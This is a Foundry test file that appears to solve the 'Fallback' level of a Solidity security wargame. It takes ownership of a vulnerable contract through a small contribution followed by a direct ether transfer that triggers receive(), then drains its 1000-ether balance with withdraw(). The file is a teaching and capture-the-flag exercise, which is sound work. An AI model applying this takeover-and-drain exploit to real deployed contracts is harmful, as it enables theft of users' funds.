// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/01_Fallback.sol";

contract Fallback_Solutions is Test {
    // Changed the name from targetContract to fallbackContract
    Fallback fallbackContract;

    function setUp() public {
        address owner = address(1);

        vm.prank(owner);
        fallbackContract = new Fallback();

        vm.deal(address(fallbackContract), 1000 ether);
    }

    function test_attack() public {
        address hacker = address(2);
        vm.deal(hacker, 1 ether);

        vm.startPrank(hacker);

        // Step 1: Contribute
        fallbackContract.contribute{value: 0.0001 ether}();

        // Step 2: Trigger receive()
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}(
            ""
        );
        require(success, "Transaction failed");

        // Step 3: Drain
        fallbackContract.withdraw();

        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0 ether);
    }
}
